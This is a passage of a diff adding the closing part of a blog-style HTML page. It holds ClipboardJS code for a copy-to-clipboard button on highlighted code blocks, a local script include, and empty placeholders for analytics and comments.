+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
